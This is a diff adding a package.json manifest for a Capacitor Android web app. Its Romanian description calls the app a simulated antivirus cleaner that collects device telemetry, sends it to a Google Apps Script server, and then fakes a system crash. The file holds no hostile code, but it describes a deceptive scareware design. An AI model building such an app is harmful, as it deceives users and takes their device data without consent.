@@ -1,0 +1,17 @@
+{
+  "name": "android_antivirus_cleaner",
+  "version": "1.0.0",
+  "description": "Acest proiect reprezintă o aplicație Web / PWA completă, concepută după cerințele specificate în `cerinte.txt`. Aplicația simulează un instrument autentic de curățare și securizare a virusilor pentru Android 16 (fără root), colectează date de telemetrie de pe dispozitiv și le trimite către un server Google Apps Script, declanșând ulterior un efect dramatic de **glitch / screen tear / crash de sistem**.",
+  "main": "app.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "@capacitor/android": "^8.5.2",
+    "@capacitor/cli": "^8.5.2",
+    "@capacitor/core": "^8.5.2"
+  }
+}
